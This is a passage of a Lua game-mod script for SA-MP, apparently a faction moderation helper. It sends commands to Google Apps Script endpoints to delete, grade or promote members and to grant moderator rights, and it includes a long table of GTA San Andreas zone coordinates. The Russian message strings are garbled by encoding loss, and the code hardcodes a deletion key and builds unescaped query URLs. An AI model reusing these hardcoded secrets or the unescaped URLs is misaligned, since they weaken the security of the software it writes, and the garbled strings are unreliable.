					if names2 == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������� ������ " .. nick .. " �� ������ �������������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� ������ �� ������ �������������.", 0xffff0000) end
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� ������� �������� � ������� ������.", 0xffff0000) 
					return 
				end
			end

			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nick .. "[" .. id .. "] {FFFAFA}- �� ������ � members", 0xFFFF0000) return
		end)
end

function cmd_del(sparams) 
	lua_thread.create(function()
		if alevel < 2 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /del [id] ([������� ��������� � ��])", 0xFFFF0000) return end
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		local id = -1
		if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
		if (id ~= -1 and not sampIsPlayerConnected(tonumber(params[1]))) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
		local nick = id == -1 and params[1] or sampGetPlayerNickname(tonumber(params[1]))
		local reg = regex.new("(.*)\\_(.*)") --
		local fname, sname = reg:match(nick)
		local nickname = "" .. fname .. " " .. sname .. ""
					
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ����������� ������� �� ������� ������ ������ {ff0000}" .. nickname .. "", 0xFFFF0000)
		if params[2] ~= nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}� ���������� � �� � ��������: {ff0000}" .. strrest(params, 2) .. ".", 0xFFFF0000) end
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� Y ��� ������������� � N ��� ������.", 0xFFFF0000)
		while true do wait(0) if isKeyDown(vkeys.VK_Y) then break end if isKeyDown(vkeys.VK_N) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������.", 0xFFFF0000) return end end
					
		local chs = params[2] ~= nil and 1 or 0
		local reason = params[2] ~= nil and strrest(params, 2) or "123"
		local result, logmyid = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local lognick = sampGetPlayerNickname(logmyid)
		local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=find&nick=' .. nickname .. '&del=3YxEKPHYQI&chs=' .. chs .. '&who=' .. lognick .. '&reason=' .. translit(reason) .. '&' .. moderpas .. '')
		local re1 = regex.new("@@.@ Row deleted (BL )?@@..@.@") --
		local names = re1:match(responsetext)
		if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������� ������ " .. nick .. " �� ������� ������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� ������� ������ �� ������� ������.", 0xffff0000) end 
		return 
	end)
end

function cmd_lek(sparams) 
	lua_thread.create(function()
		if alevel < 1 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
		
		if sparams == "" then 
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /lek [id] [pmp/rb/np/tp/nv/no]", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}pmp - ������ ���. ������, rb - ��������������, np - ������ �������������", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}tp - ����������� ����������, nv - ������ ��������, no - ������ ��������������", 0xFFFF0000)
			return 
		end
		
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		local id = -1
		if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
		if (id ~= -1 and not sampIsPlayerConnected(tonumber(params[1]))) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
		local nick = id == -1 and params[1] or sampGetPlayerNickname(tonumber(params[1]))
		if params[2] ~= "pmp" and params[2] ~= "rb" and params[2] ~= "np" and params[2] ~= "tp" and params[2] ~= "nv" and params[2] ~= "no" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������� ������.", 0xFFFF0000) return end
		local reg = regex.new("(.*)\\_(.*)") --
		local fname, sname = reg:match(nick)
		local nickname = "" .. fname .. " " .. sname .. ""
					
		local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=lek&nick=' .. nickname .. '&wto=' .. params[2] .. '&' .. moderpas .. '')
		local re1 = regex.new("@@.@ Update complete @@..@.@") --
		local names = re1:match(responsetext)
		if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ���������� ������� \"��������\" ������ " .. nick .. ".", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� \"��������\" ������ " .. nick .. " ������� �����������.", 0xffff0000) sendtolog("�������� ������� �������� ������ " .. nick .. "", 1) end 
		return
	end)
end

function cmd_mark(sparams) 
	lua_thread.create(function()
		if alevel < 2 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
		
		if sparams == "" then 
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /mark [id] [zua/zuo/zz/pmp/rb/uts/no/kp/np/op/total/dopusk] [������ 0-5] ([������� ���������])", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}zua - ������ ������ �����, zuo - ������ ������ ������, zz - ������� ����, pmp - ������ ���. ������", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}rb - ��������������, uts - ��������, no - ��������������, kp - ������/�������", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}np - �������������, op - ������� ����������", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}total - ����� ������(1 - ����/0 - �� ����), dopusk - ������ � ����� (0 - �� �������/1 - �������)", 0xFFFF0000)
			return 
		end
		
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		local id = -1
		local reason = "���"
		if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
		if id == -1 or (id ~= -1 and not sampIsPlayerConnected(tonumber(params[1]))) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
		local nick = sampGetPlayerNickname(tonumber(params[1]))
		if params[2] ~= "zua" and params[2] ~= "zuo" and params[2] ~= "zz" and params[2] ~= "pmp" and params[2] ~= "rb" and params[2] ~= "uts" and params[2] ~= "no" and params[2] ~= "kp" and params[2] ~= "np" and params[2] ~= "op" and params[2] ~= "total"  and params[2] ~= "dopusk" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������� ���������.", 0xFFFF0000) return end
		if (tonumber(params[3]) ~= nil and (((tonumber(params[3]) < 0 or tonumber(params[3]) > 5) and (params[2] ~= "dopusk" and params[2] ~= "total")) or (tonumber(params[3]) ~= 0 and tonumber(params[3]) ~= 1 and (params[2] == "dopusk" or params[2] == "total")))) or (tonumber(params[3]) == nil) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������� ������.", 0xFFFF0000) return end
		if (params[2] == "dopusk") and (tonumber(params[3]) == 0) and params[4] == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������� ���������.", 0xFFFF0000) return else reason = strrest(params, 4) end
			local Members1Text = getMembersText()
			for v in Members1Text:gmatch('[^\n]+') do
				local _, zv, afk = v:match("%[%d+%] %[(%d+)%] " .. nick .. "	(%W*) %[%d+%](.*)")
				if zv ~= nil then
					local reg = regex.new("(.*)\\_(.*)") --
					local fname, sname = reg:match(nick)
					local nickname = "" .. fname .. " " .. sname .. ""
					
					local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=mark&nick=' .. nickname .. '&wto=' .. params[2] .. '&mark=' .. params[3] .. '&reason=' .. translit(reason) .. '&' .. moderpas .. '')
					local re1 = regex.new("@@.@ Update complete @@..@.@") --
					local names = re1:match(responsetext)
					if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ���������� ������ ������ " .. nick .. ".", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ������ " .. nick .. " ������� �����������.", 0xffff0000) end 
					return 
				end
			end

		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nick .. "[" .. id .. "] {FFFAFA}- �� ������ � members", 0xFFFF0000) return
	end)
end

function cmd_change(sparams)
	lua_thread.create(function()
		if alevel < 2 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
		if sparams == "" then
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /change [id] [rank] [�������] ([�������� ������� �������])", 0xFFFF0000) 
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}rank: ��������� 1 ����� �������� ���� �� /members, 0 ����� �������� ��� ���������", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������: �����, ������������ ���������� �������, 0 ����� �������� ��� ���������, -1 ����� �������� ����.", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� �������: 0 - �������� ������ ����������, 1 - ������, 2 - ������, 3 - 2-� ��, 4 - 1-� ��, 5 - ��������, 6 - �������", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������: /change 123 1 31 1 - ��������� � ������ ������ � id 123, ������� ��� ���� � ���������� 31 �������", 0xFFFF0000)
			return
		end
		
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		local id = -1
		
		if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
		if id == -1 or (id ~= -1 and not sampIsPlayerConnected(tonumber(params[1]))) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
		local nick = sampGetPlayerNickname(tonumber(params[1]))
		if tonumber(params[3]) == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �������� \"�������\".", 0xFFFF0000) return end
		local otm = tonumber(params[3]) == 0 and "none" or tonumber(params[3]) == -1 and "" or params[3]
		local Members1Text = getMembersText()
			for v in Members1Text:gmatch('[^\n]+') do
				local _, zv, afk = v:match("%[%d+%] %[(%d+)%] " .. nick .. "	(%W*) %[%d+%](.*)")
				if zv ~= nil then
					local rank = tonumber(params[2]) == 1 and zv or "����"
					local reg = regex.new("(.*)\\_(.*)") --
					local fname, sname = reg:match(nick)
					local nickname = "" .. fname .. " " .. sname .. ""
					local uptom = params[4]
					
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ����������� �������� ���������� �� ������ {ff0000}" .. nickname .. "{fffafa} � ������� ������.", 0xFFFF0000)
					if tonumber(params[2]) == 1 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� {ff0000}������ �� " .. zv .. ".", 0xFFFF0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ �������� {ff0000}��� ���������.", 0xFFFF0000) end
					if otm == "none" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� �������� {ff0000}��� ���������.", 0xFFFF0000) elseif otm == "" then sampAddChatMessage("{FF0000}[LUA]: {ff0000}�������� ���������� �������.", 0xFFFF0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� {ff0000}���������� ������� �� " .. otm .. ".", 0xFFFF0000) end
					if uptom ~= nil then
						uptom = tonumber(uptom)
						local tarr = {[0] = "�������� ������ ����������", [1] = "��������� � �������� ������", [2] = "��������� �������� ������� �������", [3] = "��������� ������ ������������", [4] = "��������� ������ ������������", [5] = "��������� ����������", [6] = "��������� ���������", [7] = "��������� �������� ��� ���������"}
						if tarr[uptom] ~= nil then sampAddChatMessage("{FF0000}[LUA]: {ff0000}" .. tarr[uptom] .. ".", 0xFFFF0000) else sampAddChatMessage("{FF0000}[LUA]: {ff0000}�� �������� ������� �������.", 0xFFFF0000) end
					end
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� Y ��� ������������� � N ��� ������.", 0xFFFF0000)
					while true do wait(0) if isKeyDown(vkeys.VK_Y) then break end if isKeyDown(vkeys.VK_N) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������.", 0xFFFF0000) return end end
					
					if uptom == 0 then 
						local url = "https://script.google.com/macros/s/AKfycbx28UFg93in4xEHLnLjBPF-3BXRNddlNiiW0RARAZ-hHvu3kwo/exec?do=resetpass&nick=" .. nickname .. "&" .. moderpas .. ""
						local responsetext = req(url)
						local re1 = regex.new("@@.@ Update complete @@..@.@") --
						local names = re1:match(responsetext)
						if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������ ���������� ������ " .. nick .. ".", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ���������� ������ " .. nick .. " ������� �������.", 0xffff0000) end 
						return 
					end
	
					local url = 'https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=update&nick=' .. nickname .. '&rank=' .. (tonumber(params[2]) == 1 and translit(zv) or "none") .. '&hours=' .. otm .. '&' .. (uptom == 1 and "uptom=1" or uptom == 2 and "tren=1" or uptom == nil and "none" or "toruk=" .. (uptom - 2) .. "") .. '&' .. moderpas .. ''
					local responsetext = req(url)
					local re1 = regex.new("@@.@ Update complete @@..@.@") --
					local names = re1:match(responsetext)
					if names == nil then 
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ���������� �� ������ " .. nick .. " � ������� ������.", 0xffff0000) 
					else 
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� �� ������ " .. nick .. " � ������� ������ ������� ���������.", 0xffff0000)
						if uptom == 1 then sampSendChat('/me �������' .. RP .. ' ������� ����-������� ����� "�.�.�.�." ����� ' .. nickname .. '') end
					end 
					return 
				end
			end

		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nick .. "[" .. id .. "] {FFFAFA}- �� ������ � members", 0xFFFF0000) return
	end)
end

function cmd_moder(sparams)
		lua_thread.create(
				function()
						if alevel < 5 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /moder [id] [�������]", 0xFFFF0000) return end
						local params = {}
						for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end

						local id = -1
						if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
						if id ~= -1 and not sampIsPlayerConnected(tonumber(params[1])) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
						local nick = id == -1 and params[1] or sampGetPlayerNickname(tonumber(params[1]))

						local level = -1
						if tonumber(params[2]) ~= nil and tonumber(params[2]) >= 0 and tonumber(params[2]) <= 4  then level = tonumber(params[2]) end
						if level == -1 or alevel < level then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ������������ ������� �������������.", 0xFFFF0000) return end

						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ����������� ������ ����� ���������� ������ " .. nick .. "", 0xFFFF0000)
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� Y ��� ������������� � N ��� ������.", 0xFFFF0000)
						while true do wait(0) if isKeyDown(vkeys.VK_Y) then break end if isKeyDown(vkeys.VK_N) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������.", 0xFFFF0000) return end end

						local responsetext = req('https://script.google.com/macros/s/AKfycbx28UFg93in4xEHLnLjBPF-3BXRNddlNiiW0RARAZ-hHvu3kwo/exec?do=moder&name=' .. nick .. '&alevel=' .. params[2] .. '&' .. moderpas .. '')
						local re1 = regex.new("@@.@ (Add complete|Alevel changed|Delete complete|Error) @@..@.@") --
						local names = re1:match(responsetext)
						if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����������� ������.", 0xffff0000) return end

						if names == "Add complete" then sendtolog("����� ����� ���������� ������ " .. params[2] .. " ������ " .. nick .. ".", 2) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ " .. nick .. " ���� ������ ����� ����������.", 0xffff0000) return end
						if names == "Alevel changed" then sendtolog("������� ����� ���������� �� ������� " .. params[2] .. " ������ " .. nick .. ".", 2) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������� ������ " .. nick .. " ��� ������� �������.", 0xffff0000) return end
						if names == "Delete complete" then sendtolog("������ ����� ���������� � ������ ������ " .. nick .. ".", 2) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� ���������� � ������ " .. nick .. " ���� ������� �����������.", 0xffff0000) return end
						if names == "Error" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������� ����� ���������� � ������ " .. nick .. ".", 0xffff0000) return end

				end
		)
end



function calculateZone(x, y, z)
    local streets = {{"Restricted Area", -91.586, 1655.050, -50.000, 421.234, 2123.010, 250.000},
	  {"Restricted Area", 117.000000,2091.000000,-500.0,436.000000,2145.000000,500.0},
	  {"Restricted Area", -58.000000,1584.000000,-500,436.000000,1655.000000,500},
	  {"Restricted Area", 83.000000,1570.000000,-500,380.000000,1575.000000,500},
	  {"Restricted Area", 161.000000,1546.000000,-500,409.000000,1664.000000,500},
	  {"Restricted Area", 84.000000,1577.000000,-500,226.000000,1637.000000,500},
	  {"Restricted Area", 376.000000,1695.000000,-500,483.000000,1699.000000,500},
	  {"Restricted Area", 408.000000,1691.000000,-500,518.000000,1775.000000,500},
	  {"Restricted Area", 418.000000,1733.000000,-500,471.000000,2151.000000,500},
	  {"Restricted Area", 476.000000,1746.000000,-500,579.000000,1877.000000,500},
	  {"Restricted Area", 457.000000,1882.000000,-500,597.000000,1993.000000,500},
	  {"Restricted Area", 436.000000,1985.000000,-500,552.000000,2133.000000,500},
		{"Avispa Country Club", -2667.810, -302.135, -28.831, -2646.400, -262.320, 71.169},
    {"Easter Bay Airport", -1315.420, -405.388, 15.406, -1264.400, -209.543, 25.406},
    {"Avispa Country Club", -2550.040, -355.493, 0.000, -2470.040, -318.493, 39.700},
    {"Easter Bay Airport", -1490.330, -209.543, 15.406, -1264.400, -148.388, 25.406},
    {"Garcia", -2395.140, -222.589, -5.3, -2354.090, -204.792, 200.000},
    {"Shady Cabin", -1632.830, -2263.440, -3.0, -1601.330, -2231.790, 200.000},
    {"East Los Santos", 2381.680, -1494.030, -89.084, 2421.030, -1454.350, 110.916},
    {"LVA Freight Depot", 1236.630, 1163.410, -89.084, 1277.050, 1203.280, 110.916},
    {"Blackfield Intersection", 1277.050, 1044.690, -89.084, 1315.350, 1087.630, 110.916},
    {"Avispa Country Club", -2470.040, -355.493, 0.000, -2270.040, -318.493, 46.100},
    {"Temple", 1252.330, -926.999, -89.084, 1357.000, -910.170, 110.916},
    {"Unity Station", 1692.620, -1971.800, -20.492, 1812.620, -1932.800, 79.508},
    {"LVA Freight Depot", 1315.350, 1044.690, -89.084, 1375.600, 1087.630, 110.916},
    {"Los Flores", 2581.730, -1454.350, -89.084, 2632.830, -1393.420, 110.916},
    {"Starfish Casino", 2437.390, 1858.100, -39.084, 2495.090, 1970.850, 60.916},
    {"Easter Bay Chemicals", -1132.820, -787.391, 0.000, -956.476, -768.027, 200.000},
    {"Downtown Los Santos", 1370.850, -1170.870, -89.084, 1463.900, -1130.850, 110.916},
    {"Esplanade East", -1620.300, 1176.520, -4.5, -1580.010, 1274.260, 200.000},
    {"Market Station", 787.461, -1410.930, -34.126, 866.009, -1310.210, 65.874},
    {"Linden Station", 2811.250, 1229.590, -39.594, 2861.250, 1407.590, 60.406},
    {"Montgomery Intersection", 1582.440, 347.457, 0.000, 1664.620, 401.750, 200.000},
    {"Frederick Bridge", 2759.250, 296.501, 0.000, 2774.250, 594.757, 200.000},
    {"Yellow Bell Station", 1377.480, 2600.430, -21.926, 1492.450, 2687.360, 78.074},
    {"Downtown Los Santos", 1507.510, -1385.210, 110.916, 1582.550, -1325.310, 335.916},
    {"Jefferson", 2185.330, -1210.740, -89.084, 2281.450, -1154.590, 110.916},
    {"Mulholland", 1318.130, -910.170, -89.084, 1357.000, -768.027, 110.916},
    {"Avispa Country Club", -2361.510, -417.199, 0.000, -2270.040, -355.493, 200.000},
    {"Jefferson", 1996.910, -1449.670, -89.084, 2056.860, -1350.720, 110.916},
    {"Julius Thruway West", 1236.630, 2142.860, -89.084, 1297.470, 2243.230, 110.916},
    {"Jefferson", 2124.660, -1494.030, -89.084, 2266.210, -1449.670, 110.916},
    {"Julius Thruway North", 1848.400, 2478.490, -89.084, 1938.800, 2553.490, 110.916},
    {"Rodeo", 422.680, -1570.200, -89.084, 466.223, -1406.050, 110.916},
    {"Cranberry Station", -2007.830, 56.306, 0.000, -1922.000, 224.782, 100.000},
    {"Downtown Los Santos", 1391.050, -1026.330, -89.084, 1463.900, -926.999, 110.916},
    {"Redsands West", 1704.590, 2243.230, -89.084, 1777.390, 2342.830, 110.916},
    {"Little Mexico", 1758.900, -1722.260, -89.084, 1812.620, -1577.590, 110.916},
    {"Blackfield Intersection", 1375.600, 823.228, -89.084, 1457.390, 919.447, 110.916},
    {"Los Santos International", 1974.630, -2394.330, -39.084, 2089.000, -2256.590, 60.916},
    {"Beacon Hill", -399.633, -1075.520, -1.489, -319.033, -977.516, 198.511},
    {"Rodeo", 334.503, -1501.950, -89.084, 422.680, -1406.050, 110.916},
    {"Richman", 225.165, -1369.620, -89.084, 334.503, -1292.070, 110.916},
    {"Downtown Los Santos", 1724.760, -1250.900, -89.084, 1812.620, -1150.870, 110.916},
    {"The Strip", 2027.400, 1703.230, -89.084, 2137.400, 1783.230, 110.916},
    {"Downtown Los Santos", 1378.330, -1130.850, -89.084, 1463.900, -1026.330, 110.916},
    {"Blackfield Intersection", 1197.390, 1044.690, -89.084, 1277.050, 1163.390, 110.916},
    {"Conference Center", 1073.220, -1842.270, -89.084, 1323.900, -1804.210, 110.916},
    {"Montgomery", 1451.400, 347.457, -6.1, 1582.440, 420.802, 200.000},
    {"Foster Valley", -2270.040, -430.276, -1.2, -2178.690, -324.114, 200.000},
    {"Blackfield Chapel", 1325.600, 596.349, -89.084, 1375.600, 795.010, 110.916},
    {"Los Santos International", 2051.630, -2597.260, -39.084, 2152.450, -2394.330, 60.916},
    {"Mulholland", 1096.470, -910.170, -89.084, 1169.130, -768.027, 110.916},
    {"Yellow Bell Gol Course", 1457.460, 2723.230, -89.084, 1534.560, 2863.230, 110.916},
    {"The Strip", 2027.400, 1783.230, -89.084, 2162.390, 1863.230, 110.916},
    {"Jefferson", 2056.860, -1210.740, -89.084, 2185.330, -1126.320, 110.916},
    {"Mulholland", 952.604, -937.184, -89.084, 1096.470, -860.619, 110.916},
    {"Aldea Malvada", -1372.140, 2498.520, 0.000, -1277.590, 2615.350, 200.000},
    {"Las Colinas", 2126.860, -1126.320, -89.084, 2185.330, -934.489, 110.916},
    {"Las Colinas", 1994.330, -1100.820, -89.084, 2056.860, -920.815, 110.916},
    {"Richman", 647.557, -954.662, -89.084, 768.694, -860.619, 110.916},
    {"LVA Freight Depot", 1277.050, 1087.630, -89.084, 1375.600, 1203.280, 110.916},
    {"Julius Thruway North", 1377.390, 2433.230, -89.084, 1534.560, 2507.230, 110.916},
    {"Willowfield", 2201.820, -2095.000, -89.084, 2324.000, -1989.900, 110.916},
    {"Julius Thruway North", 1704.590, 2342.830, -89.084, 1848.400, 2433.230, 110.916},
    {"Temple", 1252.330, -1130.850, -89.084, 1378.330, -1026.330, 110.916},
    {"Little Mexico", 1701.900, -1842.270, -89.084, 1812.620, -1722.260, 110.916},
    {"Queens", -2411.220, 373.539, 0.000, -2253.540, 458.411, 200.000},
    {"Las Venturas Airport", 1515.810, 1586.400, -12.500, 1729.950, 1714.560, 87.500},
    {"Richman", 225.165, -1292.070, -89.084, 466.223, -1235.070, 110.916},
    {"Temple", 1252.330, -1026.330, -89.084, 1391.050, -926.999, 110.916},
    {"East Los Santos", 2266.260, -1494.030, -89.084, 2381.680, -1372.040, 110.916},
    {"Julius Thruway East", 2623.180, 943.235, -89.084, 2749.900, 1055.960, 110.916},
    {"Willowfield", 2541.700, -1941.400, -89.084, 2703.580, -1852.870, 110.916},
    {"Las Colinas", 2056.860, -1126.320, -89.084, 2126.860, -920.815, 110.916},
    {"Julius Thruway East", 2625.160, 2202.760, -89.084, 2685.160, 2442.550, 110.916},
    {"Rodeo", 225.165, -1501.950, -89.084, 334.503, -1369.620, 110.916},
    {"Las Brujas", -365.167, 2123.010, -3.0, -208.570, 2217.680, 200.000},
    {"Julius Thruway East", 2536.430, 2442.550, -89.084, 2685.160, 2542.550, 110.916},
    {"Rodeo", 334.503, -1406.050, -89.084, 466.223, -1292.070, 110.916},
    {"Vinewood", 647.557, -1227.280, -89.084, 787.461, -1118.280, 110.916},
    {"Rodeo", 422.680, -1684.650, -89.084, 558.099, -1570.200, 110.916},
    {"Julius Thruway North", 2498.210, 2542.550, -89.084, 2685.160, 2626.550, 110.916},
    {"Downtown Los Santos", 1724.760, -1430.870, -89.084, 1812.620, -1250.900, 110.916},
    {"Rodeo", 225.165, -1684.650, -89.084, 312.803, -1501.950, 110.916},
    {"Jefferson", 2056.860, -1449.670, -89.084, 2266.210, -1372.040, 110.916},
    {"Hampton Barns", 603.035, 264.312, 0.000, 761.994, 366.572, 200.000},
    {"Temple", 1096.470, -1130.840, -89.084, 1252.330, -1026.330, 110.916},
    {"Kincaid Bridge", -1087.930, 855.370, -89.084, -961.950, 986.281, 110.916},
    {"Verona Beach", 1046.150, -1722.260, -89.084, 1161.520, -1577.590, 110.916},
    {"Commerce", 1323.900, -1722.260, -89.084, 1440.900, -1577.590, 110.916},
    {"Mulholland", 1357.000, -926.999, -89.084, 1463.900, -768.027, 110.916},
    {"Rodeo", 466.223, -1570.200, -89.084, 558.099, -1385.070, 110.916},
    {"Mulholland", 911.802, -860.619, -89.084, 1096.470, -768.027, 110.916},
    {"Mulholland", 768.694, -954.662, -89.084, 952.604, -860.619, 110.916},
    {"Julius Thruway South", 2377.390, 788.894, -89.084, 2537.390, 897.901, 110.916},
    {"Idlewood", 1812.620, -1852.870, -89.084, 1971.660, -1742.310, 110.916},
    {"Ocean Docks", 2089.000, -2394.330, -89.084, 2201.820, -2235.840, 110.916},
    {"Commerce", 1370.850, -1577.590, -89.084, 1463.900, -1384.950, 110.916},
    {"Julius Thruway North", 2121.400, 2508.230, -89.084, 2237.400, 2663.170, 110.916},
    {"Temple", 1096.470, -1026.330, -89.084, 1252.330, -910.170, 110.916},
    {"Glen Park", 1812.620, -1449.670, -89.084, 1996.910, -1350.720, 110.916},
    {"Easter Bay Airport", -1242.980, -50.096, 0.000, -1213.910, 578.396, 200.000},
    {"Martin Bridge", -222.179, 293.324, 0.000, -122.126, 476.465, 200.000},
    {"The Strip", 2106.700, 1863.230, -89.084, 2162.390, 2202.760, 110.916},
    {"Willowfield", 2541.700, -2059.230, -89.084, 2703.580, -1941.400, 110.916},
    {"Marina", 807.922, -1577.590, -89.084, 926.922, -1416.250, 110.916},
    {"Las Venturas Airport", 1457.370, 1143.210, -89.084, 1777.400, 1203.280, 110.916},
    {"Idlewood", 1812.620, -1742.310, -89.084, 1951.660, -1602.310, 110.916},
    {"Esplanade East", -1580.010, 1025.980, -6.1, -1499.890, 1274.260, 200.000},
    {"Downtown Los Santos", 1370.850, -1384.950, -89.084, 1463.900, -1170.870, 110.916},
    {"The Mako Span", 1664.620, 401.750, 0.000, 1785.140, 567.203, 200.000},
    {"Rodeo", 312.803, -1684.650, -89.084, 422.680, -1501.950, 110.916},
    {"Pershing Square", 1440.900, -1722.260, -89.084, 1583.500, -1577.590, 110.916},
    {"Mulholland", 687.802, -860.619, -89.084, 911.802, -768.027, 110.916},
    {"Gant Bridge", -2741.070, 1490.470, -6.1, -2616.400, 1659.680, 200.000},
    {"Las Colinas", 2185.330, -1154.590, -89.084, 2281.450, -934.489, 110.916},
    {"Mulholland", 1169.130, -910.170, -89.084, 1318.130, -768.027, 110.916},
    {"Julius Thruway North", 1938.800, 2508.230, -89.084, 2121.400, 2624.230, 110.916},
    {"Commerce", 1667.960, -1577.590, -89.084, 1812.620, -1430.870, 110.916},
    {"Rodeo", 72.648, -1544.170, -89.084, 225.165, -1404.970, 110.916},
    {"Roca Escalante", 2536.430, 2202.760, -89.084, 2625.160, 2442.550, 110.916},
    {"Rodeo", 72.648, -1684.650, -89.084, 225.165, -1544.170, 110.916},
    {"Market", 952.663, -1310.210, -89.084, 1072.660, -1130.850, 110.916},
    {"Las Colinas", 2632.740, -1135.040, -89.084, 2747.740, -945.035, 110.916},
    {"Mulholland", 861.085, -674.885, -89.084, 1156.550, -600.896, 110.916},
    {"King's", -2253.540, 373.539, -9.1, -1993.280, 458.411, 200.000},
